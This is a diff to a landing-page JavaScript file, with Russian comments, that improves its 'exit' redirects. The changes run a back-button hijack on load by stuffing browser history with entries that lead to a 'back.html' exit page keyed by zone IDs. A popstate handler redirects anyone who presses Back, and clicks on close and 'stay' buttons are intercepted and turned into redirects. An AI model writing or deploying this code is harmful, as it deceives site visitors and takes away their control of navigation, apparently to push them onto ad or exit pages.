@@ -109,7 +109,7 @@
     try {
       const n = Math.max(0, parseInt(count, 10) || 0);
       const originalUrl = window.location.href;
-      for (let i = 0; i < n; i++) { window.history.pushState(null, "Please wait...", url); }
+      for (let i = 0; i < n; i++) { window.history.pushState({ __isBack: true }, "Please wait...", url); }
       window.history.pushState(null, document.title, originalUrl);
     } catch (e) {}
   };
@@ -117,8 +117,9 @@
   const initBackFast = (cfg) => {
     const b = cfg?.back?.currentTab;
     if (!b) return;
-    const pageUrl = cfg.back?.pageUrl || window.location.href;
-    const page = new URL(pageUrl);
+    // Исправлено: если в конфиге нет пути, берем back.html в корне
+    const pageUrl = cfg.back?.pageUrl || "back.html";
+    const page = new URL(pageUrl, window.location.origin + window.location.pathname);
     const qs = buildExitQSFast({ zoneId: b.zoneId });
     if (b.url) qs.set("url", String(b.url));
     else { qs.set("z", String(b.zoneId)); qs.set("domain", String(b.domain || cfg.domain || "")); }
@@ -172,7 +173,12 @@
   const initReverse = (cfg) => {
     if (!cfg?.reverse?.currentTab) return;
     safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
-    window.addEventListener("popstate", () => { runExitCurrentTabFast(cfg, "reverse", false); });
+    window.addEventListener("popstate", (e) => { 
+        // Если это не наш внутренний бэк-стейт, триггерим редирект
+        if (!e.state || !e.state.__isBack) {
+            runExitCurrentTabFast(cfg, "reverse", false); 
+        }
+    });
   };
 
   const initAutoexit = (cfg) => {
@@ -218,7 +224,6 @@
   // --- CLICK MAP ---
   const initClickMap = (cfg) => {
     let fired = false;
-    // ⬇️⬇️⬇️ ВОТ ЗДЕСЬ ИСПРАВЛЕНИЕ: chest_lost добавлен в список ⬇️⬇️⬇️
     const microTargets = new Set(["chest_play", "chest_lost", "banner_close", "modal_stay"]);
 
     document.addEventListener("click", (e) => {
@@ -241,7 +246,6 @@
         e.preventDefault(); run(cfg, "mainExit"); return;
       }
       
-      // Ловим chest_lost (и chest_play) и запускаем клона
       if (microTargets.has(t)) {
         e.preventDefault(); e.stopPropagation();
         if (banner) banner.style.display = "none";
@@ -264,9 +268,12 @@
 
     window.LANDING_EXITS = { cfg, run: (name) => run(cfg, name) };
     
+    // ПРАВКА: Вызываем инициализацию Бэка сразу при загрузке!
+    initBackFast(cfg); 
+    
     initClickMap(cfg);
     initAutoexit(cfg);
-    initReverse(cfg); // Инициализация Reverse (назад)
+    initReverse(cfg); 
   };
 
   if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
